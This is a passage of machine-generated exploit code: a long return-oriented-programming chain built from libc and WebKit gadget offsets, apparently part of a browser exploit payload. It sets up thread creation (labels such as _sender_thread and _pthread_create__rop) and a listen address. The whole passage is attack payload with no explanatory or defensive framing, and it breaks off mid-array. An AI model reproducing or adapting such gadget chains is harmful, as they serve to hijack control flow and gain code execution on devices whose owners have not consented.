set_gadget(libc_base+788575,); //pop rax
//L3354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+206600, //L3355+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+206592, //L3355
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3355:
db([0, 0]); // 0x0
set_gadgets([
ropchain+206616, //L3355+24
ropchain+206632, //L3350
libc_base+811575, //pop rsp
ropchain+209168, //L3356
//L3350:
libc_base+793877, //pop rsi
ropchain+206688, //L3358
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3357:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+792472,); //pop rcx
//L3358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+206776, //L3360
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+206792, //L3361
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3360:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3361:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+206936, //L3365
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+206904, //L3363
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+206920, //L3364
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3363:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3365:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+207008, //L3367
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3367:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+207064, //L3368
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3368:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+207160, //L3371
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3370:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+792472,); //pop rcx
//L3371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+207248, //L3373
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+207264, //L3374
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3373:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3374:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+207416, //L3377
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+207448, //L3379
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+207400, //L3376
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+207432, //L3378
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3376:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3377:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3378:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3379:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+207568, //L3381
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+207584, //L3382
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+207552, //L3380
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3380:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3381:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3382:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+207672, //L3384
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3384:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+207728, //L3385
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3385:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+207816, //L3388
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3387:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+792472,); //pop rcx
//L3388:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3390:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+207944, //L3392
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+207960, //L3393
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3392:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+208112, //L3396
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+208144, //L3398
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+208096, //L3395
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+208128, //L3397
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3395:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3396:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3397:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3398:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+208240, //L3400
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+208224, //L3399
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3399:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3400:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+208336, //L3402
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3401:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+792472,); //pop rcx
//L3402:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+208424, //L3404
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+208440, //L3405
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3404:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+208592, //L3408
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+208624, //L3410
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+208576, //L3407
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+208608, //L3409
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3407:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3408:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3409:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3410:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+208744, //L3412
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+208760, //L3413
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+208728, //L3411
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3411:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3412:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3413:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+208912, //L3415
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+208928, //L3416
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+208896, //L3414
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3414:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3415:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3416:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+209016, //L3417
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+209048, //L3419
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3417:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3418:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+206806,); //pop rdi
//L3419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+209112, //L3423
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+209152, //L3421
//L3281:
libc_base+811575, //pop rsp
ropchain+209168, //L3356
//L3421:
libc_base+811575, //pop rsp
ropchain+203160, //L3266
//L3356:
//L3145:
libc_base+788575 //pop rax
]);
//L3424:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3425:
ropchain+172368, //_sender_thread
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3426:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+209368, //L3428
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3427:
db([4294965192, 4294967295]); // -0x838
set_gadget(libc_base+788575,); //pop rax
//L3428:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3430:
ropchain+209480, //L3429
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+147688, //_pthread_create__rop
//L3429:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+209568, //L3432
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3431:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L3432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+209656, //L3434
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+209672, //L3435
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3434:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3435:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+209816, //L3439
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+209784, //L3437
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+209800, //L3438
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3437:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3438:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3439:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3441:
ropchain+209920, //L3440
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+217344, //L3442
//L3440:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+209992, //L3443
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3443:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3444:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3445:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+210144, //L3447
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210160, //L3448
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+210128, //L3446
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3446:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3447:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3448:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+210256, //L3449
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210272, //L3450
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3449:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3450:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+210384, //L3451
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210368, //L3452
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3452:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3451:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+210472, //L3454
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+210456, //L3453
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3453:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+210568, //L3455
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210584, //L3456
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3455:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+210696, //L3457
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210680, //L3458
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3458:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3457:
db([0, 0]); // 0x0
//L3226:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
listen_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+212024, //L3459
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3459:
db([0, 0]); // 0x0
//L3152:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
